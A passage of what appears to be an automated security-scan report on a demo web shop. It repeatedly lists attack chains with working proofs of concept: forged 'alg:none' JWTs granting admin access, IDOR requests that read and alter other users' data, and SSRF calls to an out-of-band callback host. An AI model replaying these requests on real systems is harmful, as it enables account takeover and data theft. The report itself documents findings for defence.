  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → pii_read
  - session — GET https://duck-store.escape.tech/api/v1/users/me/profile (and all JWT-protected endpoints) · PoC: `1. Register a user: POST /api/v1/auth/register -> get valid JWT (HS256)
2. Use jwt_tool to generate "alg:none" token: jwt_tool <token> -X a
3. Generated token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0OTIyOX0.
4. Test on /api/v1/users/me/profile: Returns 200 OK with user data (auth bypass)
5. Modify payload to role:"admin": eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3OTA2NDkyMjl9.
6. Test on /api/v1/admin/users: Returns 200 OK with full user list including admin users (privilege escalation)

The server accepts tokens with "alg": "none", "None", "NONE", "nOnE" variants.`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → pii_read
  - session — GET https://duck-store.escape.tech/api/v1/users/me/profile (and all JWT-protected endpoints) · PoC: `1. Register a user: POST /api/v1/auth/register -> get valid JWT (HS256)
2. Use jwt_tool to generate "alg:none" token: jwt_tool <token> -X a
3. Generated token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0OTIyOX0.
4. Test on /api/v1/users/me/profile: Returns 200 OK with user data (auth bypass)
5. Modify payload to role:"admin": eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3OTA2NDkyMjl9.
6. Test on /api/v1/admin/users: Returns 200 OK with full user list including admin users (privilege escalation)

The server accepts tokens with "alg": "none", "None", "NONE", "nOnE" variants.`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → pii_read
  - session — GET https://duck-store.escape.tech/api/v1/users/me/profile (and all JWT-protected endpoints) · PoC: `1. Register a user: POST /api/v1/auth/register -> get valid JWT (HS256)
2. Use jwt_tool to generate "alg:none" token: jwt_tool <token> -X a
3. Generated token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0OTIyOX0.
4. Test on /api/v1/users/me/profile: Returns 200 OK with user data (auth bypass)
5. Modify payload to role:"admin": eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3OTA2NDkyMjl9.
6. Test on /api/v1/admin/users: Returns 200 OK with full user list including admin users (privilege escalation)

The server accepts tokens with "alg": "none", "None", "NONE", "nOnE" variants.`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink returned 200 with a 265B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink returned 200 with a 265B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink returned 200 with a 265B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink returned 200 with a 265B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: internal_http → internal_http → metadata_access
  - internal_http — https://duck-store.escape.tech/login · PoC: `OOB callback oob44fd443fb14a.datf6t0hgqag02gk65agnaytj47t1eyph interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-29T09:13:53.215047+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://duck-store.escape.tech/api/v1/uploads/import-from-url · PoC: `OOB callback oOb13C84E8ADCa1.datF6T0hgqag02gk65AGnAYTJ47t1EyPh interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-28T23:32:33.151627+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://duck-store.escape.tech/api/v1/uploads/import-from-url · PoC: `OOB callback oOb13C84E8ADCa1.datF6T0hgqag02gk65AGnAYTJ47t1EyPh interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-28T23:32:33.151627+00:00`
- Chain: internal_http → internal_http → metadata_access
  - internal_http — https://duck-store.escape.tech/login · PoC: `OOB callback oob44fd443fb14a.datf6t0hgqag02gk65agnaytj47t1eyph interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-29T09:13:53.215047+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://duck-store.escape.tech/api/v1/uploads/import-from-url · PoC: `OOB callback oOb13C84E8ADCa1.datF6T0hgqag02gk65AGnAYTJ47t1EyPh interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-28T23:32:33.151627+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — GET https://duck-store.escape.tech/api/v1/uploads/fetch-url · PoC: `Request:
GET https://duck-store.escape.tech/api/v1/uploads/fetch-url?url=http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Response:
{
  "url": "http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf",
  "status_code": 200,
  "content_type": "text/html; charset=utf-8",
  "content_length": 72,
  "preview": "<html><head></head><body>hpye1t74jtyanga56kg20gaqgh0t6ftad</body></html>"
}

The OOB callback at oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in was triggered, confirming the server made an outbound request to the attacker-controlled domain.`
- Chain: internal_http → internal_http → metadata_access
  - internal_http — https://duck-store.escape.tech/login · PoC: `OOB callback oob44fd443fb14a.datf6t0hgqag02gk65agnaytj47t1eyph interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-29T09:13:53.215047+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — GET https://duck-store.escape.tech/api/v1/uploads/fetch-url · PoC: `Request:
GET https://duck-store.escape.tech/api/v1/uploads/fetch-url?url=http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Response:
{
  "url": "http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf",
  "status_code": 200,
  "content_type": "text/html; charset=utf-8",
  "content_length": 72,
  "preview": "<html><head></head><body>hpye1t74jtyanga56kg20gaqgh0t6ftad</body></html>"
}

The OOB callback at oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in was triggered, confirming the server made an outbound request to the attacker-controlled domain.`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://duck-store.escape.tech/api/v1/uploads/import-from-url · PoC: `OOB callback oOb13C84E8ADCa1.datF6T0hgqag02gk65AGnAYTJ47t1EyPh interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-28T23:32:33.151627+00:00`
- Chain: internal_http → internal_http → metadata_access
  - internal_http — https://duck-store.escape.tech/login · PoC: `OOB callback oob44fd443fb14a.datf6t0hgqag02gk65agnaytj47t1eyph interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-29T09:13:53.215047+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — GET https://duck-store.escape.tech/api/v1/uploads/fetch-url · PoC: `Request:
GET https://duck-store.escape.tech/api/v1/uploads/fetch-url?url=http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Response:
{
  "url": "http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf",
  "status_code": 200,
  "content_type": "text/html; charset=utf-8",
  "content_length": 72,
  "preview": "<html><head></head><body>hpye1t74jtyanga56kg20gaqgh0t6ftad</body></html>"
}

The OOB callback at oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in was triggered, confirming the server made an outbound request to the attacker-controlled domain.`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — GET https://duck-store.escape.tech/api/v1/uploads/fetch-url · PoC: `Request:
GET https://duck-store.escape.tech/api/v1/uploads/fetch-url?url=http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Response:
{
  "url": "http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf",
  "status_code": 200,
  "content_type": "text/html; charset=utf-8",
  "content_length": 72,
  "preview": "<html><head></head><body>hpye1t74jtyanga56kg20gaqgh0t6ftad</body></html>"
}

The OOB callback at oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in was triggered, confirming the server made an outbound request to the attacker-controlled domain.`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/products/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/ returned 200 with a 2691B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/products/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/ returned 200 with a 2691B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/products/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/ returned 200 with a 2691B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

